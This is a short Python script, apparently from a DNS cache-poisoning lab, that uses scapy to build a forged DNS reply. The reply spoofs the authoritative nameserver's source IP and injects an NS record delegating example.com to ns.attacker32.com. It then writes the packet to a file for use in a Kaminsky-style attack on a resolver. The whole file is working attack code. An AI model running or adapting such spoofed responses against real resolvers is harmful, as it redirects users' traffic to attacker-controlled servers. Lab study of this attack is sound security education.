#!/usr/bin/env python3
import sys
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR

name = 'twysw.example.com'
domain = 'example.com'
ns = 'ns.attacker32.com'

# Cho phép truyền IP nguồn của Name Server từ tham số CLI (mặc định 199.43.133.53 - a.iana-servers.net)
src_ns_ip = sys.argv[1] if len(sys.argv) > 1 else "199.43.133.53"

Qdsec = DNSQR(qname=name)
Anssec = DNSRR(rrname=name, type='A', rdata='1.2.3.4', ttl=259200)
NSsec = DNSRR(rrname=domain, type='NS', rdata=ns, ttl=259200)
dns = DNS(id=0xAAAA, aa=1, rd=1, qr=1, qdcount=1, ancount=1, nscount=1, arcount=0, qd=Qdsec, an=Anssec, ns=NSsec)

ip = IP(dst="10.2.6.53", src=src_ns_ip)
udp = UDP(dport=44444, sport=53, chksum=0)

pkt = ip/udp/dns
with open('ip_resp.bin', 'wb') as f:
    f.write(bytes(pkt))

print(f"Created ip_resp.bin successfully (Spoofed Source IP: {src_ns_ip}).")

